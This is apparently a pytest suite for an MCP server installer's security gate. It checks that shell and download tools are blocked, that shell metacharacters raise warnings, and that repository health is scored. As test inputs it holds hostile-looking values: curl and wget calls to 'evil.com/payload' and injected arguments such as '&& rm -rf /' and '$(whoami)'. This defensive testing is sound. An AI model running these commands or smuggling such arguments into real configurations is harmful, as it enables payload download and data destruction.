"""Tests for the security gate module (security/gate.py) and its integration in configure.py."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from mcp_tap.models import (
    ConfigLocation,
    ConnectionTestResult,
    InstallResult,
    MaturitySignals,
    MCPClient,
    SecurityReport,
    SecurityRisk,
    SecuritySignal,
)
from mcp_tap.security.gate import (
    _check_command,
    _check_github,
    run_security_gate,
)
from mcp_tap.tools.configure import configure_server

# ─── Helpers ─────────────────────────────────────────────────


def _make_ctx(
    *,
    connection_tester: AsyncMock | None = None,
    healing: AsyncMock | None = None,
    installer_resolver: AsyncMock | None = None,
    security_gate: AsyncMock | None = None,
) -> MagicMock:
    """Build a mock Context with AppContext injected into lifespan_context."""
    from mcp_tap.models import HealingResult
    from mcp_tap.security.gate import DefaultSecurityGate
    from mcp_tap.server import AppContext

    # Default healing mock returns failed result
    if healing is None:
        healing = AsyncMock()
        healing.heal_and_retry = AsyncMock(return_value=HealingResult(fixed=False, attempts=[]))

    # Default security gate uses the real implementation with no http_client
    if security_gate is None:
        security_gate = DefaultSecurityGate(http_client=None)

    app = MagicMock(spec=AppContext)
    app.connection_tester = connection_tester or AsyncMock()
    app.healing = healing
    app.installer_resolver = installer_resolver or AsyncMock()
    app.security_gate = security_gate

    ctx = MagicMock()
    ctx.request_context.lifespan_context = app
    ctx.info = AsyncMock()
    ctx.error = AsyncMock()
    return ctx


def _fake_location(
    client: MCPClient = MCPClient.CLAUDE_CODE,
    path: str = "/tmp/fake_config.json",
    scope: str = "user",
    exists: bool = True,
) -> ConfigLocation:
    return ConfigLocation(client=client, path=path, scope=scope, exists=exists)


def _ok_install_result(identifier: str = "test-pkg") -> InstallResult:
    return InstallResult(
        success=True,
        package_identifier=identifier,
        install_method="npx",
        message=f"Package {identifier} verified.",
    )


def _ok_connection_result(
    server_name: str = "test-server",
    tools: list[str] | None = None,
) -> ConnectionTestResult:
    return ConnectionTestResult(
        success=True,
        server_name=server_name,
        tools_discovered=tools or ["read_query", "write_query"],
    )


def _mock_installer(
    install_result: InstallResult | None = None,
    command: str = "npx",
    args: list[str] | None = None,
) -> MagicMock:
    """Build a mock installer with configurable install result and command."""
    installer = MagicMock()
    installer.install = AsyncMock(return_value=install_result or _ok_install_result())
    installer.build_server_command = MagicMock(
        return_value=(command, args if args is not None else ["-y", "test-pkg"]),
    )
    return installer


def _healthy_metadata() -> MaturitySignals:
    """Metadata for a healthy repo: many stars, licensed, recent, not archived."""
    return MaturitySignals(
        stars=500,
        forks=50,
        open_issues=5,
        last_commit_date="2026-01-15T10:00:00Z",
        is_archived=False,
        license="MIT",
    )


# ═══════════════════════════════════════════════════════════════
# Command Check Tests
# ═══════════════════════════════════════════════════════════════


class TestCheckCommand:
    """Tests for _check_command (command safety analysis)."""

    def test_clean_command_passes(self):
        """npx with normal args should produce no signals."""
        signals = _check_command("npx", ["-y", "@mcp/server-postgres"])
        assert signals == []

    def test_uvx_command_passes(self):
        """uvx (Python runner) should produce no signals."""
        signals = _check_command("uvx", ["mcp-server-git"])
        assert signals == []

    def test_suspicious_command_bash_blocked(self):
        """bash command should produce a BLOCK signal."""
        signals = _check_command("bash", ["-c", "echo hello"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK
        assert signals[0].category == "command"
        assert "bash" in signals[0].message

    def test_suspicious_command_sh_blocked(self):
        """sh command should produce a BLOCK signal."""
        signals = _check_command("sh", ["-c", "something"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK

    def test_suspicious_command_curl_blocked(self):
        """curl command should produce a BLOCK signal."""
        signals = _check_command("curl", ["https://evil.com/payload"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK
        assert "curl" in signals[0].message

    def test_suspicious_command_wget_blocked(self):
        """wget command should produce a BLOCK signal."""
        signals = _check_command("wget", ["https://evil.com/payload"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK

    def test_suspicious_command_powershell_blocked(self):
        """powershell command should produce a BLOCK signal."""
        signals = _check_command("powershell", ["-Command", "Get-Process"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK

    def test_suspicious_command_cmd_blocked(self):
        """cmd command should produce a BLOCK signal."""
        signals = _check_command("cmd", ["/c", "dir"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK

    def test_full_path_extracts_basename(self):
        """Should check basename even when full path is given."""
        signals = _check_command("/usr/bin/bash", ["-c", "echo"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK

    def test_windows_path_extracts_basename(self):
        """Should handle backslash path separators."""
        signals = _check_command("C:\\Windows\\System32\\cmd", ["/c", "dir"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.BLOCK

    def test_shell_metacharacters_warn(self):
        """Args with pipes/backticks should produce a WARN signal."""
        signals = _check_command("npx", ["-y", "pkg", "| grep something"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.WARN
        assert "metacharacters" in signals[0].message

    def test_shell_metacharacters_ampersand(self):
        """Args with && should produce a WARN signal."""
        signals = _check_command("npx", ["-y", "pkg", "&& rm -rf /"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.WARN

    def test_shell_metacharacters_dollar_paren(self):
        """Args with $() should produce a WARN signal."""
        signals = _check_command("npx", ["-y", "$(whoami)"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.WARN

    def test_shell_metacharacters_backtick(self):
        """Args with backticks should produce a WARN signal."""
        signals = _check_command("npx", ["-y", "`whoami`"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.WARN

    def test_shell_metacharacters_redirect(self):
        """Args with >> should produce a WARN signal."""
        signals = _check_command("npx", ["-y", "pkg", ">> /tmp/out"])
        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.WARN

    def test_suspicious_command_and_metacharacters_both(self):
        """Should produce both BLOCK and WARN when both issues present."""
        signals = _check_command("bash", ["-c", "echo | grep"])
        assert len(signals) == 2
        risks = {s.risk for s in signals}
        assert SecurityRisk.BLOCK in risks
        assert SecurityRisk.WARN in risks


# ═══════════════════════════════════════════════════════════════
# GitHub Check Tests
# ═══════════════════════════════════════════════════════════════


class TestCheckGitHub:
    """Tests for _check_github (repository analysis)."""

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_archived_repo_blocked(self, mock_fetch: AsyncMock):
        """Archived repository should produce a BLOCK signal."""
        mock_fetch.return_value = MaturitySignals(
            stars=100,
            is_archived=True,
            license="MIT",
            last_commit_date="2025-06-01T00:00:00Z",
        )
        http_client = MagicMock()
        signals = await _check_github("https://github.com/owner/repo", http_client)

        block_signals = [s for s in signals if s.risk == SecurityRisk.BLOCK]
        assert len(block_signals) == 1
        assert block_signals[0].category == "archived"
        assert "archived" in block_signals[0].message.lower()

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_low_stars_warns(self, mock_fetch: AsyncMock):
        """Repository with fewer than 5 stars should produce a WARN signal."""
        mock_fetch.return_value = MaturitySignals(
            stars=2,
            is_archived=False,
            license="MIT",
            last_commit_date="2026-01-01T00:00:00Z",
        )
        http_client = MagicMock()
        signals = await _check_github("https://github.com/owner/repo", http_client)

        warn_signals = [s for s in signals if s.category == "stars"]
        assert len(warn_signals) == 1
        assert warn_signals[0].risk == SecurityRisk.WARN
        assert "2 stars" in warn_signals[0].message

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_no_license_warns(self, mock_fetch: AsyncMock):
        """No license should produce a WARN signal."""
        mock_fetch.return_value = MaturitySignals(
            stars=100,
            is_archived=False,
            license=None,
            last_commit_date="2026-01-01T00:00:00Z",
        )
        http_client = MagicMock()
        signals = await _check_github("https://github.com/owner/repo", http_client)

        license_signals = [s for s in signals if s.category == "license"]
        assert len(license_signals) == 1
        assert license_signals[0].risk == SecurityRisk.WARN
        assert "license" in license_signals[0].message.lower()

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_stale_repo_warns(self, mock_fetch: AsyncMock):
        """Repository with last commit > 1 year ago should produce a WARN signal."""
        mock_fetch.return_value = MaturitySignals(
            stars=100,
            is_archived=False,
            license="MIT",
            last_commit_date="2024-01-01T00:00:00Z",  # > 1 year ago
        )
        http_client = MagicMock()
        signals = await _check_github("https://github.com/owner/repo", http_client)

        stale_signals = [s for s in signals if s.category == "stale"]
        assert len(stale_signals) == 1
        assert stale_signals[0].risk == SecurityRisk.WARN
        assert "days ago" in stale_signals[0].message

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_all_pass(self, mock_fetch: AsyncMock):
        """Healthy repo with many stars, license, and recent activity should pass clean."""
        mock_fetch.return_value = _healthy_metadata()
        http_client = MagicMock()
        signals = await _check_github("https://github.com/owner/repo", http_client)

        assert signals == []

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_github_fetch_failure_warns(self, mock_fetch: AsyncMock):
        """When fetch_repo_metadata returns None, should produce a WARN signal."""
        mock_fetch.return_value = None
        http_client = MagicMock()
        signals = await _check_github("https://github.com/owner/repo", http_client)

        assert len(signals) == 1
        assert signals[0].risk == SecurityRisk.WARN
        assert signals[0].category == "repository"
        assert "metadata" in signals[0].message.lower()

    async def test_non_github_url_skips(self):
        """Non-GitHub URL should produce no signals (graceful skip)."""
        http_client = MagicMock()
        signals = await _check_github("https://gitlab.com/owner/repo", http_client)
        assert signals == []

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_github_exception_silent(self, mock_fetch: AsyncMock):
        """Exception during GitHub check should be silently caught (non-blocking)."""
        mock_fetch.side_effect = RuntimeError("network error")
        http_client = MagicMock()
        signals = await _check_github("https://github.com/owner/repo", http_client)

        # Should not raise, and should return empty (logged at debug level)
        assert signals == []


# ═══════════════════════════════════════════════════════════════
# run_security_gate Integration Tests
# ═══════════════════════════════════════════════════════════════


class TestRunSecurityGate:
    """Tests for the full run_security_gate orchestrator."""

    async def test_overall_risk_block_if_any_block(self):
        """One BLOCK signal should make overall risk BLOCK."""
        report = await run_security_gate(
            package_identifier="evil-pkg",
            repository_url="",
            command="bash",
            args=["-c", "echo"],
            http_client=None,
        )

        assert report.overall_risk == SecurityRisk.BLOCK
        assert not report.passed
        assert len(report.blockers) >= 1

    async def test_overall_risk_warn_if_any_warn(self):
        """One WARN signal should make overall risk WARN (no BLOCK)."""
        report = await run_security_gate(
            package_identifier="pkg",
            repository_url="",
            command="npx",
            args=["-y", "pkg", "| grep foo"],
            http_client=None,
        )

        assert report.overall_risk == SecurityRisk.WARN
        assert report.passed  # WARN does not block
        assert len(report.warnings) >= 1
        assert len(report.blockers) == 0

    async def test_overall_risk_pass_clean(self):
        """Clean command with no GitHub URL should pass."""
        report = await run_security_gate(
            package_identifier="@mcp/server-postgres",
            repository_url="",
            command="npx",
            args=["-y", "@mcp/server-postgres"],
            http_client=None,
        )

        assert report.overall_risk == SecurityRisk.PASS
        assert report.passed
        assert report.warnings == []
        assert report.blockers == []

    async def test_no_http_client_skips_github(self):
        """None http_client should skip GitHub checks gracefully."""
        report = await run_security_gate(
            package_identifier="pkg",
            repository_url="https://github.com/owner/repo",
            command="npx",
            args=["-y", "pkg"],
            http_client=None,
        )

        # GitHub checks skipped, command is clean
        assert report.overall_risk == SecurityRisk.PASS
        assert report.signals == []

    async def test_empty_repo_url_skips_github(self):
        """Empty repository_url should skip GitHub checks."""
        report = await run_security_gate(
            package_identifier="pkg",
            repository_url="",
            command="npx",
            args=["-y", "pkg"],
            http_client=MagicMock(),
        )

        assert report.overall_risk == SecurityRisk.PASS

    @patch("mcp_tap.security.gate.fetch_repo_metadata")
    async def test_github_signals_included(self, mock_fetch: AsyncMock):
        """GitHub signals should be included when URL and client are provided."""
        mock_fetch.return_value = MaturitySignals(
            stars=1,
            is_archived=False,
            license=None,
            last_commit_date="2026-01-01T00:00:00Z",
        )
        http_client = MagicMock()

        report = await run_security_gate(
            package_identifier="pkg",
            repository_url="https://github.com/owner/repo",
            command="npx",
            args=["-y", "pkg"],
            http_client=http_client,
        )

        assert report.overall_risk == SecurityRisk.WARN
        categories = {s.category for s in report.signals}
        assert "stars" in categories
        assert "license" in categories


# ═══════════════════════════════════════════════════════════════
# SecurityReport Model Tests
# ═══════════════════════════════════════════════════════════════


class TestSecurityReportModel:
    """Tests for SecurityReport properties."""

    def test_passed_true_when_pass(self):
        report = SecurityReport(overall_risk=SecurityRisk.PASS)
        assert report.passed is True

    def test_passed_true_when_warn(self):
        report = SecurityReport(overall_risk=SecurityRisk.WARN)
        assert report.passed is True

    def test_passed_false_when_block(self):
        report = SecurityReport(overall_risk=SecurityRisk.BLOCK)
        assert report.passed is False

    def test_warnings_property(self):
        report = SecurityReport(
            overall_risk=SecurityRisk.WARN,
            signals=[
                SecuritySignal(category="a", risk=SecurityRisk.WARN, message="w1"),
                SecuritySignal(category="b", risk=SecurityRisk.PASS, message="ok"),
                SecuritySignal(category="c", risk=SecurityRisk.WARN, message="w2"),
            ],
        )
        assert len(report.warnings) == 2
        assert all(w.risk == SecurityRisk.WARN for w in report.warnings)

    def test_blockers_property(self):
        report = SecurityReport(
            overall_risk=SecurityRisk.BLOCK,
            signals=[
                SecuritySignal(category="a", risk=SecurityRisk.BLOCK, message="b1"),
                SecuritySignal(category="b", risk=SecurityRisk.WARN, message="w1"),
            ],
        )
        assert len(report.blockers) == 1
        assert report.blockers[0].category == "a"


# ═══════════════════════════════════════════════════════════════
# configure_server Integration Tests
# ═══════════════════════════════════════════════════════════════


class TestConfigureSecurityGateIntegration:
    """Tests for security gate integration in configure_server."""

    @patch("mcp_tap.tools.configure.write_server_config")
    @patch("mcp_tap.tools.configure.resolve_config_locations")
    async def test_configure_blocked_by_security(
        self,
        mock_locations: MagicMock,
        mock_write: MagicMock,
    ):
        """configure_server should return failure when command is suspicious."""
        mock_locations.return_value = [_fake_location()]
        # Installer returns "bash" as the command -- should be blocked
        installer_resolver = AsyncMock()
        installer_resolver.resolve_installer = AsyncMock(
            return_value=_mock_installer(command="bash", args=["-c", "echo server"])
        )

        connection_tester = AsyncMock()

        ctx = _make_ctx(
            installer_resolver=installer_resolver,
            connection_tester=connection_tester,
        )
        result = await configure_server(
            server_name="evil-server",
            package_identifier="evil-pkg",
            ctx=ctx,
            clients="claude_code",
        )

        assert result["success"] is False
        assert result["install_status"] == "blocked_by_security"
        assert "Security gate BLOCKED" in result["message"]
        assert "trusted alternative" in result["message"]
        # Config should NOT be written
        mock_write.assert_not_called()
        # test_server_connection should NOT be called (blocked before validation)
        connection_tester.test_server_connection.assert_not_called()

    @patch("mcp_tap.tools.configure.write_server_config")
    @patch("mcp_tap.tools.configure.resolve_config_locations")
    async def test_configure_passes_security(
        self,
        mock_locations: MagicMock,
        mock_write: MagicMock,
    ):
        """configure_server should proceed normally when command is safe."""
        mock_locations.return_value = [_fake_location()]
        installer_resolver = AsyncMock()
        installer_resolver.resolve_installer = AsyncMock(
            return_value=_mock_installer(command="npx", args=["-y", "safe-pkg"])
        )

        connection_tester = AsyncMock()
        connection_tester.test_server_connection = AsyncMock(
            return_value=_ok_connection_result("safe-server")
        )

        ctx = _make_ctx(
            installer_resolver=installer_resolver,
            connection_tester=connection_tester,
        )
        result = await configure_server(
            server_name="safe-server",
            package_identifier="safe-pkg",
            ctx=ctx,
            clients="claude_code",
        )

        assert result["success"] is True
        assert result["install_status"] == "installed"
        assert result["validation_passed"] is True
        mock_write.assert_called_once()

    @patch("mcp_tap.tools.configure.write_server_config")
    @patch("mcp_tap.tools.configure.resolve_config_locations")
    async def test_configure_warns_but_proceeds(
        self,
        mock_locations: MagicMock,
        mock_write: MagicMock,
    ):
        """configure_server should proceed (with warnings) when only WARN signals."""
        mock_locations.return_value = [_fake_location()]
        # Args with pipe metacharacter -- WARN only, not BLOCK
        installer_resolver = AsyncMock()
        installer_resolver.resolve_installer = AsyncMock(
            return_value=_mock_installer(command="npx", args=["-y", "pkg", "| something"])
        )

        connection_tester = AsyncMock()
        connection_tester.test_server_connection = AsyncMock(
            return_value=_ok_connection_result("warn-server")
        )

        ctx = _make_ctx(
            installer_resolver=installer_resolver,
            connection_tester=connection_tester,
        )
        result = await configure_server(
            server_name="warn-server",
            package_identifier="warn-pkg",
            ctx=ctx,
            clients="claude_code",
        )

        # WARN does not block installation
        assert result["success"] is True
        assert result["validation_passed"] is True
        # Security warning should have been logged via ctx.info
        ctx.info.assert_any_await(
            pytest.approx(
                "Security warning: Server arguments contain shell metacharacters."
                " Review carefully.",
                abs=0,
            )
        )

    @patch("mcp_tap.tools.configure.write_server_config")
    @patch("mcp_tap.tools.configure.resolve_config_locations")
    async def test_security_gate_exception_non_blocking(
        self,
        mock_locations: MagicMock,
        mock_write: MagicMock,
    ):
        """Security gate exception should NOT block installation (non-blocking)."""
        mock_locations.return_value = [_fake_location()]
        installer_resolver = AsyncMock()
        installer_resolver.resolve_installer = AsyncMock(return_value=_mock_installer())

        connection_tester = AsyncMock()
        connection_tester.test_server_connection = AsyncMock(return_value=_ok_connection_result())

        # Security gate that raises -- should be caught gracefully
        security_gate = AsyncMock()
        security_gate.run_security_gate = AsyncMock(side_effect=RuntimeError("gate crashed"))

        ctx = _make_ctx(
            installer_resolver=installer_resolver,
            connection_tester=connection_tester,
            security_gate=security_gate,
        )
        result = await configure_server(
            server_name="server",
            package_identifier="pkg",
            ctx=ctx,
            clients="claude_code",
        )

        # Installation should proceed despite gate failure
        assert result["success"] is True
